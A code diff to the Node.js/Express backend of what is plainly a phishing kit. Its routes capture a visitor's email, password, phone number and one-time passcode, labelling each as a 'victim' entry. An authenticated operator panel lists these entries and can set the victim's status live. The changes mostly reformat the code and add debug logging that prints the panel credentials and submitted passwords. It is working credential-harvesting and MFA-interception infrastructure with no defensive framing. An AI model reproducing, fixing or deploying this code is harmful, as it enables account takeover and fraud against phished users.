@@ -1,27 +1,27 @@
 /* ----------  DEPENDENCIES  ---------- */
-const express    = require('express');
-const bodyParser = require('body-parser');
-const cors       = require('cors');
-const crypto     = require('crypto');
-const session    = require('cookie-session');
+const express = require('express');
+const cors    = require('cors');
+const crypto  = require('crypto');
+const session = require('cookie-session');
 
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
-console.log('ENV check:', { PANEL_USER, PANEL_PASS });
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-// Trust proxy - REQUIRED for sessions behind reverse proxy
+console.log('ENV check:', { PANEL_USER, PANEL_PASS });   // leave in for now
+
+// Trust proxy – required behind Railway / Render
 app.set('trust proxy', 1);
 
 app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json());                       // modern body parser
+app.use(express.urlencoded({ extended: true })); // <<-- this was missing / too late
 
-// Session middleware - MUST be before routes
+// Session middleware – MUST be before routes
 app.use(session({
   name: 'pan_sess',
   keys: [SESSION_SECRET],
@@ -51,55 +51,35 @@ app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
 app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
 /* ----------  PANEL ACCESS CONTROL  ---------- */
-
-// Main panel route - check auth and serve appropriate file
 app.get('/panel', (req, res) => {
   console.log('GET /panel - authed:', req.session?.authed);
-  
-  if (req.session && req.session.authed === true) {
-    return res.sendFile(__dirname + '/_panel.html');
-  }
-  
+  if (req.session?.authed === true) return res.sendFile(__dirname + '/_panel.html');
   res.sendFile(__dirname + '/access.html');
 });
 
-// Handle login form submission - MUST be exact path match
 app.post('/panel/login', (req, res) => {
+  // ---- DEBUG:  what did we actually receive? ----
+  console.log('headers:', req.headers['content-type']);
+  console.log('body raw:', req.body);
+  // ----------------------------------------------
   const { user, pw } = req.body;
-  console.log('LOGIN ATTEMPT:', { user, pw, envUser: PANEL_USER, envPass: PANEL_PASS });
-  
-  console.log('POST /panel/login - user:', user);
-  
+  console.log('POST /panel/login - user:', user, 'pw:', pw);
+
   if (user === PANEL_USER && pw === PANEL_PASS) {
-    req.session.authed = true;
+    req.session.authed   = true;
     req.session.username = user;
-    
-    console.log('Login successful, redirecting to /panel');
-    
-    // Use absolute redirect
     return res.redirect(302, '/panel');
-  } else {
-    console.log('Login failed');
-    return res.redirect(302, '/panel?fail=1');
   }
+  res.redirect(302, '/panel?fail=1');
 });
 
-// Catch any other /panel/* routes and redirect to /panel
-app.get('/panel/*', (req, res) => {
-  res.redirect(302, '/panel');
-});
-
-app.post('/panel/logout', (req, res) => {
-  req.session = null;
-  res.redirect('/panel');
-});
-
-// Block direct file access
+app.get('/panel/*', (req, res) => res.redirect(302, '/panel'));
+app.post('/panel/logout', (req, res) => { req.session = null; res.redirect('/panel'); });
 app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
-  const host = req.headers.host || req.hostname;
+  const host  = req.headers.host || req.hostname;
   const proto = req.headers['x-forwarded-proto'] || req.protocol;
   currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
   next();
@@ -197,14 +177,10 @@ app.post('/api/login', async (req, res) => {
     v.entered = true; v.email = email; v.password = password;
     v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
-    
+
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'ENTERED CREDENTIALS', 
-      detail: `Client: ${email}` 
-    });
-    
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
+
     auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
     res.sendStatus(200);
   } catch (err) {
@@ -219,17 +195,12 @@ app.post('/api/verify', async (req, res) => {
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.phone = phone;
-    v.status = 'wait';
+    v.phone = phone; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
-    
+
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'ENTERED PHONE', 
-      detail: `Phone: ${phone}` 
-    });
-    
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
+
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
     res.sendStatus(200);
@@ -246,14 +217,10 @@ app.post('/api/unregister', async (req, res) => {
     const v = sessionsMap.get(sid);
     v.unregisterClicked = true; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
-    
+
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'CLICKED UNREGISTER', 
-      detail: 'Victim proceeded to unregister page' 
-    });
-    
+    v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
+
     res.sendStatus(200);
   } catch (err) {
     console.error('Unregister error', err);
@@ -269,20 +236,16 @@ app.post('/api/otp', async (req, res) => {
     const v = sessionsMap.get(sid);
     v.otp = otp; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
-    
+
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'ENTERED OTP', 
-      detail: `OTP: ${otp}` 
-    });
-    
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
+
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
-    res.status(500).send('Error');
+    res.sendStatus(500);
   }
 });
 
@@ -294,14 +257,10 @@ app.post('/api/page', async (req, res) => {
     const oldPage = v.page;
     v.page = page;
     sessionActivity.set(sid, Date.now());
-    
+
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ 
-      time: Date.now(), 
-      action: 'PAGE CHANGE', 
-      detail: `${oldPage} → ${page}` 
-    });
-    
+    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
+
     res.sendStatus(200);
   } catch (err) {
     console.error('Page change error', err);
@@ -337,28 +296,22 @@ app.post('/api/interaction', (req, res) => {
   const { sid, type, data } = req.body;
   if (!sessionsMap.has(sid)) return res.sendStatus(404);
   const v = sessionsMap.get(sid);
-  
   v.lastInteraction = Date.now();
   v.interactions = v.interactions || [];
   v.interactions.push({ type, data, time: Date.now() });
-  
   sessionActivity.set(sid, Date.now());
   res.sendStatus(200);
 });
 
 /* ----------  PANEL API  ---------- */
 app.get('/api/user', (req, res) => {
-  if (req.session?.authed) {
-    return res.json({ username: req.session.username || PANEL_USER });
-  }
+  if (req.session?.authed) return res.json({ username: req.session.username || PANEL_USER });
   res.status(401).json({ error: 'Not authenticated' });
 });
 
 app.get('/api/panel', (req, res) => {
-  if (!req.session?.authed) {
-    return res.status(401).json({ error: 'Not authenticated' });
-  }
-  
+  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
+
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
@@ -366,7 +319,7 @@ app.get('/api/panel', (req, res) => {
     entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
-  
+
   res.json({
     domain: currentDomain,
     username: req.session?.username || PANEL_USER,
@@ -380,10 +333,8 @@ app.get('/api/panel', (req, res) => {
 });
 
 app.post('/api/panel', async (req, res) => {
-  if (!req.session?.authed) {
-    return res.status(401).json({ error: 'Not authenticated' });
-  }
-  
+  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
+
   const { action, sid } = req.body;
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
@@ -417,7 +368,4 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
-
 });
-
-
